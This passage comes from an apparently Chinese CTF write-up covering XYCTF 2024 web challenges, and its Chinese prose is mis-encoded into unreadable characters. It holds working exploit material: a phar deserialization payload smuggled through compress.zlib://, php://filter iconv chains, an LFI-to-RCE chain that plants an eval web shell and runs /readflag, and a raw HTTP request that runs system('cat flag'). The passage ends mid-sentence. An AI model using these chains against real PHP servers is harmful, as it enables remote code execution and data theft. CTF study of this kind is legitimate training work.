class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^phar:\/\//i&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬æ‰“å¼€class.phpå¯ä»¥å‘ç° evilç±»é‡Œç”¨evalå‡½æ•°<br>è€Œå‰é¢çš„wafå¯¼è‡´æˆ‘ä»¬åªèƒ½ç»™cmdä¼ å…¥å­—æ¯,ä¸‹åˆ’çº¿,å’Œå°æ‹¬å·ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨pharçš„æ–‡ä»¶å°¾è¿›è¡Œæˆªæ–­æ¥ç»•è¿‡åé¢å­—ç¬¦çš„æ‹¼æ¥ã€‚<code>__HALT_COMPILER();</code>è¯¥æ–‡ä»¶å°¾éƒ¨åçš„ä»£ç éƒ½ä¸ä¼šè¢«è¯†åˆ«ã€‚<br>æˆ–è€…ä½¿ç”¨<code>__halt_compiler();</code>æ¥ä¸­æ–­ç¼–è¯‘å™¨ã€‚<br>è¿˜æœ‰ä¸€ä¸ªç‚¹æ˜¯ï¼šç”±äºæˆ‘ä»¬æ— æ³•è¾“å…¥å¼•å·æ‰€æœ‰æˆ‘ä»¬éœ€è¦è¿›è¡Œé€ƒé€¸ï¼Œåˆå› ä¸ºæˆ‘ä»¬æ— æ³•è¾“å…¥<code>$</code>æ‰€æœ‰æˆ‘ä»¬ä½¿ç”¨å‡½æ•°æ¥è¿›è¡Œæ— å‚å‘½ä»¤æ‰§è¡Œã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></p><p>è€Œä¸‹é¢çš„æ–‡ä»¶å¤„ç†å‡½æ•°å¯ä»¥è§¦å‘pharååºåˆ—åŒ–ï¼Œå…¶wafä½¿å¾—æ— æ³•å†å­—ç¬¦å¤´éƒ¨å‡ºç°pharï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¼ªåè®®åµŒå¥—æ¥ç»•è¿‡ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> Bzip/Gzip å½“ç¯å¢ƒé™åˆ¶äº†pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œã€‚å¯ä»¥ä½¿ç”¨compress.bzip2://å’Œcompress.zlib://ç»•è¿‡</span><br><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///home/sx/test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br><span class="line"></span><br><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„æ‰€æœ‰éƒ½å¯ä»¥è§¦å‘pharååºåˆ—åŒ–<br>ç„¶åæˆ‘ä»¬å†ä¸Šä¼ çš„æ—¶å€™æç¤ºæˆ‘ä»¬æ–‡ä»¶ä¸­ä¸èƒ½å‡ºç°<code>__HALT_COMPILER();</code>è¿™ä¸ªæˆ‘ä»¬å¯ä»¥ä½¿ç”¨gzipæ¥ç»•è¿‡ï¼Œå°†è¯¥æ–‡ä»¶ä½¿ç”¨gzipå‹ç¼©åä¸Šä¼ ï¼Œä»ç„¶å¯ä»¥ä½¿ç”¨pahræ¥è§¦å‘ååºåˆ—åŒ–ï¼Œè€Œè¢«å‹ç¼©çš„æ–‡ä»¶ä¸­ä¹Ÿå°±æ²¡æœ‰è¯¥æ–‡ä»¶å°¾äº†ã€‚<br>ä¸‹é¢å¼€å§‹åˆ¶ä½œæ”»å‡»pharæ–‡ä»¶<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;eval(end(getallheaders()));__HALT_COMPILER();&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//è®¾ç½®sutb</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;123123&gt;&quot;</span>);<span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><br>å°†ç”Ÿæˆçš„æ–‡ä»¶å†kaliä¸‹ä½¿ç”¨gzipå‹ç¼©ï¼Œæ”¹åç¼€ä¸ºjpgä¸Šä¼ ï¼Œä¹‹åè¿›è¡Œè§¦å‘ã€‚<br><img src="/2024/04/25/XYCTF-web/1.png" class="" title="alt text"><br>è®°ä¸‹æ–‡ä»¶åç”¨äºè§¦å‘ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /class.php HTTP/1.1</span><br><span class="line">Host: 192.168.223.1:14144</span><br><span class="line">Content-Length: 85</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.223.1:14144</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.223.1:14144/class.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">a: system(&#x27;cat flag&#x27;);</span><br><span class="line"></span><br><span class="line">file=compress.zlib://phar%3A%2F%2F%2Ftmp%2F628941e623f5a967093007bf39be805f.jpg</span><br></pre></td></tr></table></figure></p><h1 id="è¿è¿çœ‹åˆ°åº•æ˜¯è¿è¿ä»€ä¹ˆçœ‹"><a href="#è¿è¿çœ‹åˆ°åº•æ˜¯è¿è¿ä»€ä¹ˆçœ‹" class="headerlink" title="è¿è¿çœ‹åˆ°åº•æ˜¯è¿è¿ä»€ä¹ˆçœ‹"></a>è¿è¿çœ‹åˆ°åº•æ˜¯è¿è¿ä»€ä¹ˆçœ‹</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥æ˜¯è¦ä½¿ç”¨è¿‡æ»¤å™¨æ¥è¿›è¡Œæ„é€ å‡ºXYCTFä¸‹é¢æ˜¯æ–‡ç« <br><a href="https://tttang.com/archive/1395/#toc_php-base64-filter">hxp CTF 2021 - The End Of LFI?</a><br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=1#reply-list">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨</a><br>ç¬¬ä¸€ç¯‡æ–‡ç« çš„æ„é€ æ–¹æ³•åœ¨ç½‘ä¸Šå¯ä»¥æ‰¾åˆ°è„šæœ¬ï¼Œæ•´ä½“åŸç†å°±æ˜¯åˆ©ç”¨å­—ç¬¦é›†çš„è½¬æ¢å’Œbase64è¿‡æ»¤å™¨çš„å®½æ³›æ€§æ¥è¿›è¡Œæ„é€ ã€‚<br>æˆ‘ä»¬ä½¿ç”¨è„šæœ¬è·‘å‡ºæ¥çš„åªèƒ½åœ¨æ–‡ä»¶çš„å¤´éƒ¨æ„é€ å‡ºXYCTFã€‚å¦‚ä¸‹<br><br>è¿™æ—¶å€™æˆ‘ä»¬éœ€è¦ä½¿ç”¨åˆ°string.strip_tagsè¿™ä¸ªè¿‡æ»¤å™¨ï¼Œè¿™ä¸ªè¿‡æ»¤å™¨å¯ä»¥åˆ é™¤æ ‡ç­¾é‚£ä¹ˆæˆ‘ä»¬æ„é€ XYCTF&lt;?<br>æœ€åå†ä½¿ç”¨string.strip_tagså¯¹å¤šä½™çš„å†…å®¹è¿›è¡Œåˆ é™¤å³å¯<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags/resource=/etc/passwd</span><br></pre></td></tr></table></figure></p><h1 id="ezLFI"><a href="#ezLFI" class="headerlink" title="ezLFI"></a>ezLFI</h1><p>è¿™é¢˜å’Œä¸Šä¸€é¢˜åº”è¯¥æ˜¯è”åŠ¨çš„ï¼Œè¿™é¢˜æ‰“å¼€ä¼šå‘ç°æ˜¯åº”è¯¥LFIè€Œä¸Šé¢æ„é€ çš„æ–‡ç« åŸæœ¬è®²çš„å°±æ˜¯ä»LFIåˆ°RCEçš„æ¼æ´å‡çº§ä½¿ç”¨æˆ‘ä»¬ç›´æ¥æ„é€ &lt;?php @eval($_POST[1]);?&gt;æ¥è¿›è¡Œæ–‡ä»¶åŒ…å«åˆ°å‘½ä»¤æ‰§è¡Œã€‚<br>ä¹‹åå†æ‰§è¡Œ/readflagå³å¯<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;1=system(&quot;/readflag&quot;);</span><br></pre></td></tr></table></figure></p><h1 id="give-me-flag"><a href="#give-me-flag" class="headerlink" title="give me flag"></a>give me flag</h1><p>è¿™é¢˜è€ƒçš„æ˜¯å“ˆå¸Œæ‰©å±•æ”»å‡»ï¼Œè¿™ä¸ªæˆ‘å†åšå®¢é‡Œä¹Ÿåˆå†™åŸç†ã€‚æˆ‘è¿™é‡Œå°±ç›´æ¥å†™æ€è·¯äº†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$FLAG_md5</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG_md5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes, give you flag: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">5</span>c44b944c29af7cb3dfa247a0c2a84c7</span><br></pre></td></tr></table></figure><br>é¦–å…ˆå…¶æ³„éœ²äº†flagçš„å“ˆå¸Œå€¼ã€‚æˆ‘ä»¬å†çœ‹ä¸€ä¸‹å…¶ä»–é¢˜ç›®çš„flagå°±çŸ¥é“flagé•¿åº¦ä¸º43ä¸ªå­—ç¬¦ã€‚<br>è€Œå…¶åˆ¤æ–­è¯­å¥æ¯”è¾ƒäº†ä»¥ä¸‹ä¸¤ä¸ªå€¼<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span></span><br></pre></td></tr></table></figure><br>valueæˆ‘ä»¬å¯æ§ï¼Œè€Œtimeæˆ‘ä»¬åªè¦å†åé¢æ‹¼æ¥ä¸€ä¸ªå½“å‰timeå‡ åç§’çš„æ•°æ®ä¹‹åä¸€ç›´å‘åŒ…å³å¯ã€‚ï¼ˆæœ¬æ¥æ˜¯æƒ³ç”¨pythonè„šæœ¬æ¥ç›´æ¥è®²timeå¡«å……çš„å­—ç¬¦æ‹¼æ¥ä¹‹åå‘åŒ…çš„ä½†æ˜¯ç½‘ä¸Šç®€å•çš„è„šæœ¬æˆ‘å› ä¸ºç¯å¢ƒçš„åŸå› éƒ½æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œè€Œå¤æ‚çš„å¼€æºè„šæœ¬çœ‹ä¸æ‡‚ã€‚ã€‚ã€‚ï¼‰<br>æˆ‘ä»¬è¿™é‡Œä½¿ç”¨çš„æ˜¯hash-ext-attack<br><br>ä¹‹åå°±æ˜¯ä¸æ–­çš„å‘åŒ…ç™»timeè¾“å…¥çš„ä¸æ‰©å±•å­—ç¬¦ç›¸åŒæ—¶å³å¯å¾—å‡ºç­”æ¡ˆã€‚</p><h1 id="æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº"><a href="#æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº" class="headerlink" title="æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº"></a>æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº</h1><p>é¦–å…ˆæ˜¯çˆ†ç ´ç™»é™†ã€‚<br>ä¹‹åä¼šæœ‰ä¸€ä¸ªå¤è¯»çš„æ¡†ã€‚çœ‹åˆ°è¿™ä¸ªçš„æ—¶å€™ç¬¬ä¸€æ—¶é—´å°±æœ‰æƒ³åˆ°ä½¿ç”¨sstiã€‚å› 